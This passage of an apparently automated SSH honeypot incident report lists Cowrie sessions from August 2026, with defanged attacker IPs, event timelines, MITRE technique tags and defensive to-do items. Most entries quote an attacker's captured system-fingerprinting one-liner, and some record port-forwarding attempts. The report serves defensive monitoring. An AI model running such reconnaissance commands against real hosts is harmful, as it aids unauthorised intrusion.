| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:59:50` | `cowrie.session.connect` |
| `2026-08-11 06:59:50` | `cowrie.client.version` |
| `2026-08-11 06:59:56` | `cowrie.client.kex` |
| `2026-08-11 06:59:57` | `cowrie.login.success` |
| `2026-08-11 06:59:59` | `cowrie.session.params` |
| `2026-08-11 06:59:59` | `cowrie.command.input` |
| `2026-08-11 06:59:59` | `cowrie.command.input` |
| `2026-08-11 06:59:59` | `cowrie.command.input` |
| `2026-08-11 06:59:59` | `cowrie.command.input` |
| `2026-08-11 06:59:59` | `cowrie.command.input` |
| `2026-08-11 06:59:59` | `cowrie.command.success` |
| `2026-08-11 06:59:59` | `cowrie.command.input` |
| `2026-08-11 06:59:59` | `cowrie.command.input` |
| `2026-08-11 06:59:59` | `cowrie.command.input` |
| `2026-08-11 06:59:59` | `cowrie.command.input` |
| `2026-08-11 07:00:00` | `cowrie.log.closed` |
| `2026-08-11 07:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea6b906d80a8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:02 |
| **Last Seen** | 2026-08-11 07:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:02:00` | `cowrie.session.connect` |
| `2026-08-11 07:02:00` | `cowrie.client.version` |
| `2026-08-11 07:02:00` | `cowrie.client.kex` |
| `2026-08-11 07:02:02` | `cowrie.login.success` |
| `2026-08-11 07:02:03` | `cowrie.session.params` |
| `2026-08-11 07:02:03` | `cowrie.command.input` |
| `2026-08-11 07:02:03` | `cowrie.command.input` |
| `2026-08-11 07:02:03` | `cowrie.command.input` |
| `2026-08-11 07:02:03` | `cowrie.command.input` |
| `2026-08-11 07:02:03` | `cowrie.command.input` |
| `2026-08-11 07:02:03` | `cowrie.command.success` |
| `2026-08-11 07:02:03` | `cowrie.command.input` |
| `2026-08-11 07:02:03` | `cowrie.command.input` |
| `2026-08-11 07:02:03` | `cowrie.command.input` |
| `2026-08-11 07:02:03` | `cowrie.command.input` |
| `2026-08-11 07:02:04` | `cowrie.log.closed` |
| `2026-08-11 07:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a51e8ee402b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:04 |
| **Last Seen** | 2026-08-11 07:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:04:12` | `cowrie.session.connect` |
| `2026-08-11 07:04:13` | `cowrie.client.version` |
| `2026-08-11 07:04:13` | `cowrie.client.kex` |
| `2026-08-11 07:04:14` | `cowrie.login.success` |
| `2026-08-11 07:04:16` | `cowrie.session.params` |
| `2026-08-11 07:04:16` | `cowrie.command.input` |
| `2026-08-11 07:04:16` | `cowrie.command.input` |
| `2026-08-11 07:04:16` | `cowrie.command.input` |
| `2026-08-11 07:04:16` | `cowrie.command.input` |
| `2026-08-11 07:04:16` | `cowrie.command.input` |
| `2026-08-11 07:04:16` | `cowrie.command.success` |
| `2026-08-11 07:04:16` | `cowrie.command.input` |
| `2026-08-11 07:04:16` | `cowrie.command.input` |
| `2026-08-11 07:04:16` | `cowrie.command.input` |
| `2026-08-11 07:04:16` | `cowrie.command.input` |
| `2026-08-11 07:04:16` | `cowrie.log.closed` |
| `2026-08-11 07:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-775f2f01fcdf

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:06 |
| **Last Seen** | 2026-08-11 07:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:06:24` | `cowrie.session.connect` |
| `2026-08-11 07:06:24` | `cowrie.client.version` |
| `2026-08-11 07:06:24` | `cowrie.client.kex` |
| `2026-08-11 07:06:26` | `cowrie.login.success` |
| `2026-08-11 07:06:28` | `cowrie.session.params` |
| `2026-08-11 07:06:28` | `cowrie.command.input` |
| `2026-08-11 07:06:28` | `cowrie.command.input` |
| `2026-08-11 07:06:28` | `cowrie.command.input` |
| `2026-08-11 07:06:28` | `cowrie.command.input` |
| `2026-08-11 07:06:28` | `cowrie.command.input` |
| `2026-08-11 07:06:28` | `cowrie.command.success` |
| `2026-08-11 07:06:28` | `cowrie.command.input` |
| `2026-08-11 07:06:28` | `cowrie.command.input` |
| `2026-08-11 07:06:28` | `cowrie.command.input` |
| `2026-08-11 07:06:28` | `cowrie.command.input` |
| `2026-08-11 07:06:28` | `cowrie.log.closed` |
| `2026-08-11 07:06:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d753e64eee

| Field | Detail |
|---|---|
| **Source IP** | `182.156.80[.]11` |
| **First Seen** | 2026-08-11 07:10 |
| **Last Seen** | 2026-08-11 07:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:10:37` | `cowrie.session.connect` |
| `2026-08-11 07:10:38` | `cowrie.client.version` |
| `2026-08-11 07:10:38` | `cowrie.client.kex` |
| `2026-08-11 07:10:40` | `cowrie.login.success` |
| `2026-08-11 07:10:40` | `cowrie.direct-tcpip.request` |
| `2026-08-11 07:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `182.156.80[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d53a4882c8f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:10 |
| **Last Seen** | 2026-08-11 07:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:10:39` | `cowrie.session.connect` |
| `2026-08-11 07:10:39` | `cowrie.client.version` |
| `2026-08-11 07:10:39` | `cowrie.client.kex` |
| `2026-08-11 07:10:41` | `cowrie.login.success` |
| `2026-08-11 07:10:42` | `cowrie.session.params` |
| `2026-08-11 07:10:42` | `cowrie.command.input` |
| `2026-08-11 07:10:42` | `cowrie.command.input` |
| `2026-08-11 07:10:42` | `cowrie.command.input` |
| `2026-08-11 07:10:42` | `cowrie.command.input` |
| `2026-08-11 07:10:42` | `cowrie.command.input` |
| `2026-08-11 07:10:42` | `cowrie.command.success` |
| `2026-08-11 07:10:42` | `cowrie.command.input` |
| `2026-08-11 07:10:42` | `cowrie.command.input` |
| `2026-08-11 07:10:42` | `cowrie.command.input` |
| `2026-08-11 07:10:42` | `cowrie.command.input` |
| `2026-08-11 07:10:43` | `cowrie.log.closed` |
| `2026-08-11 07:10:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626339765a5c

| Field | Detail |
|---|---|
| **Source IP** | `111.42.175[.]101` |
| **First Seen** | 2026-08-11 07:10 |
| **Last Seen** | 2026-08-11 07:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:10:50` | `cowrie.session.connect` |
| `2026-08-11 07:10:51` | `cowrie.client.version` |
| `2026-08-11 07:10:51` | `cowrie.client.kex` |
| `2026-08-11 07:10:53` | `cowrie.login.success` |
| `2026-08-11 07:10:54` | `cowrie.direct-tcpip.request` |
| `2026-08-11 07:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.42.175[.]101` to AbuseIPDB if not already reported
- [ ] Block `111.42.175[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-127ac4a8c45f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:12 |
| **Last Seen** | 2026-08-11 07:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:12:50` | `cowrie.session.connect` |
| `2026-08-11 07:12:50` | `cowrie.client.version` |
| `2026-08-11 07:12:50` | `cowrie.client.kex` |
| `2026-08-11 07:12:51` | `cowrie.login.success` |
| `2026-08-11 07:12:53` | `cowrie.session.params` |
| `2026-08-11 07:12:53` | `cowrie.command.input` |
| `2026-08-11 07:12:53` | `cowrie.command.input` |
| `2026-08-11 07:12:53` | `cowrie.command.input` |
| `2026-08-11 07:12:53` | `cowrie.command.input` |
| `2026-08-11 07:12:53` | `cowrie.command.input` |
| `2026-08-11 07:12:53` | `cowrie.command.success` |
| `2026-08-11 07:12:53` | `cowrie.command.input` |
| `2026-08-11 07:12:53` | `cowrie.command.input` |
| `2026-08-11 07:12:53` | `cowrie.command.input` |
| `2026-08-11 07:12:53` | `cowrie.command.input` |
| `2026-08-11 07:12:54` | `cowrie.log.closed` |
| `2026-08-11 07:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5489d54763d

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]151` |
| **First Seen** | 2026-08-11 07:14 |
| **Last Seen** | 2026-08-11 07:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:14:44` | `cowrie.session.connect` |
| `2026-08-11 07:14:44` | `cowrie.client.version` |
| `2026-08-11 07:14:44` | `cowrie.client.kex` |
| `2026-08-11 07:14:46` | `cowrie.login.success` |
| `2026-08-11 07:14:46` | `cowrie.direct-tcpip.request` |
| `2026-08-11 07:14:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]151` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84f46410e87a

| Field | Detail |
|---|---|
| **Source IP** | `49.124.142[.]137` |
| **First Seen** | 2026-08-11 07:14 |
| **Last Seen** | 2026-08-11 07:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:14:52` | `cowrie.session.connect` |
| `2026-08-11 07:14:53` | `cowrie.client.version` |
| `2026-08-11 07:14:53` | `cowrie.client.kex` |
| `2026-08-11 07:14:55` | `cowrie.login.success` |
| `2026-08-11 07:14:55` | `cowrie.direct-tcpip.request` |
| `2026-08-11 07:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.142[.]137` to AbuseIPDB if not already reported
- [ ] Block `49.124.142[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deabedecf508

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:14 |
| **Last Seen** | 2026-08-11 07:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:14:58` | `cowrie.session.connect` |
| `2026-08-11 07:14:58` | `cowrie.client.version` |
| `2026-08-11 07:14:58` | `cowrie.client.kex` |
| `2026-08-11 07:15:00` | `cowrie.login.success` |
| `2026-08-11 07:15:01` | `cowrie.session.params` |
| `2026-08-11 07:15:01` | `cowrie.command.input` |
| `2026-08-11 07:15:01` | `cowrie.command.input` |
| `2026-08-11 07:15:01` | `cowrie.command.input` |
| `2026-08-11 07:15:01` | `cowrie.command.input` |
| `2026-08-11 07:15:01` | `cowrie.command.input` |
| `2026-08-11 07:15:01` | `cowrie.command.success` |
| `2026-08-11 07:15:01` | `cowrie.command.input` |
| `2026-08-11 07:15:01` | `cowrie.command.input` |
| `2026-08-11 07:15:01` | `cowrie.command.input` |
| `2026-08-11 07:15:01` | `cowrie.command.input` |
| `2026-08-11 07:15:01` | `cowrie.log.closed` |
| `2026-08-11 07:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-066369846adf

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:17 |
| **Last Seen** | 2026-08-11 07:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:17:10` | `cowrie.session.connect` |
| `2026-08-11 07:17:10` | `cowrie.client.version` |
| `2026-08-11 07:17:10` | `cowrie.client.kex` |
| `2026-08-11 07:17:12` | `cowrie.login.success` |
| `2026-08-11 07:17:13` | `cowrie.session.params` |
| `2026-08-11 07:17:13` | `cowrie.command.input` |
| `2026-08-11 07:17:13` | `cowrie.command.input` |
| `2026-08-11 07:17:13` | `cowrie.command.input` |
| `2026-08-11 07:17:13` | `cowrie.command.input` |
| `2026-08-11 07:17:13` | `cowrie.command.input` |
| `2026-08-11 07:17:13` | `cowrie.command.success` |
| `2026-08-11 07:17:13` | `cowrie.command.input` |
| `2026-08-11 07:17:13` | `cowrie.command.input` |
| `2026-08-11 07:17:13` | `cowrie.command.input` |
| `2026-08-11 07:17:13` | `cowrie.command.input` |
| `2026-08-11 07:17:14` | `cowrie.log.closed` |
| `2026-08-11 07:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7472164d1e9e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:19 |
| **Last Seen** | 2026-08-11 07:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:19:17` | `cowrie.session.connect` |
| `2026-08-11 07:19:17` | `cowrie.client.version` |
| `2026-08-11 07:19:17` | `cowrie.client.kex` |
| `2026-08-11 07:19:19` | `cowrie.login.success` |
| `2026-08-11 07:19:20` | `cowrie.session.params` |
| `2026-08-11 07:19:20` | `cowrie.command.input` |
| `2026-08-11 07:19:20` | `cowrie.command.input` |
| `2026-08-11 07:19:20` | `cowrie.command.input` |
| `2026-08-11 07:19:20` | `cowrie.command.input` |
| `2026-08-11 07:19:20` | `cowrie.command.input` |
| `2026-08-11 07:19:20` | `cowrie.command.success` |
| `2026-08-11 07:19:20` | `cowrie.command.input` |
| `2026-08-11 07:19:20` | `cowrie.command.input` |
| `2026-08-11 07:19:20` | `cowrie.command.input` |
| `2026-08-11 07:19:20` | `cowrie.command.input` |
| `2026-08-11 07:19:20` | `cowrie.log.closed` |
| `2026-08-11 07:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a23c24f91110

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:21 |
| **Last Seen** | 2026-08-11 07:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:21:27` | `cowrie.session.connect` |
| `2026-08-11 07:21:27` | `cowrie.client.version` |
| `2026-08-11 07:21:27` | `cowrie.client.kex` |
| `2026-08-11 07:21:29` | `cowrie.login.success` |
| `2026-08-11 07:21:30` | `cowrie.session.params` |
| `2026-08-11 07:21:30` | `cowrie.command.input` |
| `2026-08-11 07:21:30` | `cowrie.command.input` |
| `2026-08-11 07:21:30` | `cowrie.command.input` |
| `2026-08-11 07:21:30` | `cowrie.command.input` |
| `2026-08-11 07:21:30` | `cowrie.command.input` |
| `2026-08-11 07:21:30` | `cowrie.command.success` |
| `2026-08-11 07:21:30` | `cowrie.command.input` |
| `2026-08-11 07:21:30` | `cowrie.command.input` |
| `2026-08-11 07:21:30` | `cowrie.command.input` |
| `2026-08-11 07:21:31` | `cowrie.command.input` |
| `2026-08-11 07:21:31` | `cowrie.log.closed` |
| `2026-08-11 07:21:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc3ff8861521

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:23 |
| **Last Seen** | 2026-08-11 07:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
